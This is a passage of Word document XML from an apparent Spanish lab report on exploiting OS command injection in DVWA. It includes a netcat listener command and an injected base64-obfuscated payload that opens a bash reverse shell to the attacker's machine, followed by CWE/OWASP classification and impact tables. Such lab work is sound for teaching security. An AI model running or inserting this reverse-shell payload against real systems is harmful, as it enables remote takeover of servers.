        <w:pStyle w:val="Listaconvietas"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">muestra la identidad del usuario actual: UID, GID y grupos a los que pertenece (por ejemplo, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CdigoHTML"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>uid=0(root) gid=0(root)</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41928F26" w14:textId="42CD288D" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r w:rsidRPr="00431D11">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Paso 3 —</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00431D11">
        <w:t>Finalmente con esto, podriamos generar un revere shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53997067" w14:textId="1AC854C9" w:rsidR="00FE2535" w:rsidRDefault="00FE2535">
      <w:r>
        <w:t xml:space="preserve">3.1 obtenemos nuestra ip conel commando  </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE2535">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>ip a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">   imagen2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DEBFC2" w14:textId="624EB6BF" w:rsidR="00FE2535" w:rsidRDefault="00FE2535">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="53297BA0" wp14:editId="586B8D66">
            <wp:extent cx="5626559" cy="16205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4193" t="12373" r="34819" b="57045"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5647073" cy="1626478"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C5986E" w14:textId="20485FDC" w:rsidR="00FE2535" w:rsidRDefault="00FE2535">
      <w:r w:rsidRPr="00FE2535">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Imagen 6.2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IP máquina</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13922BDA" w14:textId="1D0725F1" w:rsidR="00FE2535" w:rsidRDefault="00FE2535" w:rsidP="00FE2535">
      <w:r>
        <w:t xml:space="preserve">3.2  Utilizamos la heramienta NetCat junto con los otros commandos </w:t>
      </w:r>
      <w:r w:rsidR="009C6AAB">
        <w:t>imagen 6.3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="25C7481A" wp14:editId="5157DAE8">
            <wp:extent cx="5304162" cy="2525917"/>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2017" t="37461" r="40797" b="24744"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5356731" cy="2550951"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="364759A1" w14:textId="5499279C" w:rsidR="009C6AAB" w:rsidRDefault="009C6AAB" w:rsidP="00FE2535">
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Imagen 6.3 </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Comando NC </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47764BD7" w14:textId="77777777" w:rsidR="00FE2535" w:rsidRDefault="00FE2535" w:rsidP="00FE2535">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0404AF7E" w14:textId="08C9F986" w:rsidR="00FE2535" w:rsidRDefault="00FE2535" w:rsidP="00FE2535">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r w:rsidRPr="00FE2535">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nc -lvnp 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A50FDCF" w14:textId="7B28C62D" w:rsidR="009C6AAB" w:rsidRDefault="009C6AAB">
      <w:r>
        <w:t xml:space="preserve">3.3 Finalmente entramos a la pagina de DVWA ejecutamos el command injection </w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:t>127.0.0.1 ; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNDQ0NCAwPiYxCg== | base64 -d | bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64DA7BC1" w14:textId="77777777" w:rsidR="009C6AAB" w:rsidRPr="009C6AAB" w:rsidRDefault="009C6AAB" w:rsidP="009C6AAB">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Conexión normal (directa):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCA8849" w14:textId="77777777" w:rsidR="009C6AAB" w:rsidRPr="009C6AAB" w:rsidRDefault="009C6AAB" w:rsidP="009C6AAB">
      <w:pPr>
        <w:pStyle w:val="HTMLconformatoprevio"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Atacante ──conecta──</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>►</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> V</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>í</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>ctima</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DB24F2" w14:textId="77777777" w:rsidR="009C6AAB" w:rsidRPr="009C6AAB" w:rsidRDefault="009C6AAB" w:rsidP="009C6AAB">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Reverse Shell:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05862D27" w14:textId="7EA5A6D0" w:rsidR="009C6AAB" w:rsidRPr="00E64671" w:rsidRDefault="009C6AAB" w:rsidP="00E64671">
      <w:pPr>
        <w:pStyle w:val="HTMLconformatoprevio"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Atacante </w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>◄</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>──</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>conecta</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>──</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> V</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>í</w:t>
      </w:r>
      <w:r w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>ctima</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1BC895" w14:textId="33FD775E" w:rsidR="00AE5F76" w:rsidRPr="00E64671" w:rsidRDefault="00FE2535">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="647AB535" wp14:editId="5D7F92E5">
            <wp:extent cx="5950698" cy="161019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2046" t="78005" r="45848" b="-1731"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6005295" cy="1624965"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="009C6AAB" w:rsidRPr="009C6AAB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>Imagen 6.4</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> —Reverse shell obtenida vía Command Injection</w:t>
      </w:r>
      <w:r w:rsidR="009C6AAB">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051C3FB3" w14:textId="3CEDE9E5" w:rsidR="009C6AAB" w:rsidRDefault="009C6AAB">
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">De la imagen 6.4 podemos identificar que nos conectamos al servidor </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
        </w:rPr>
        <w:t>¡La conexión llegó!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DVWA se conectó de vuelta a tu Kali desde el puerto 50290</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EAE1CE" w14:textId="4D6F40A6" w:rsidR="00AE5F76" w:rsidRDefault="00015E0E">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>6.6</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Clasificación técnica</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4315"/>
        <w:gridCol w:w="4315"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="296EA97C" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="08E58856" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Referencia</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="68ABFF51" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Detalle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="704205DE" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1568B279" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CWE-78</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6C9376D0" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>OS Command Injection — neutralización impropia de elementos especiales en comandos del SO</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="1E6D8BA6" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="2FE7FCAD" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CVE-2014-6271</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="71D54965" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Shellshock — command injection masivo en Bash a través de variables de entorno HTTP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="38662290" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6B931EC4" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>OWASP Top 10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="06103FA4" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>A03:2021 – Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="48C1A999" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="4148B9B1" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CVSS v4.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="1E088ACD" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>~9.8 Critical — ejecución remota de comandos sin autenticación</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4894253A" w14:textId="2E0A223E" w:rsidR="00AE5F76" w:rsidRDefault="004F4753">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>6.7</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Impacto esperado en un sistema real</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2877"/>
        <w:gridCol w:w="2876"/>
        <w:gridCol w:w="2877"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="665E2351" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="76650952" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Dimensión CIA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="1D23742B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Impacto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="742C6651" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Justificación</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="43D1EAA9" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="447DB7DD" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Confidencialidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2603602B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CRÍTICO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A8D2504" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Lectura de cualquier archivo accesible por www-data: claves SSH, credenciales de BD, código fuente.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="5BD15F5E" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="672437EC" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Integridad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="73825377" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CRÍTICO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="69C8EA4C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Escritura de archivos, instalación de malware, creación de nuevos usuarios del SO, modificación de logs.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="3E36C3ED" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A44795C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Disponibilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7FF07A96" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CRÍTICO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="479BC739" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Apagado del servidor, eliminación de archivos críticos, denegación de servicio.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56073C5B" w14:textId="1DD92A17" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>6</w:t>
      </w:r>
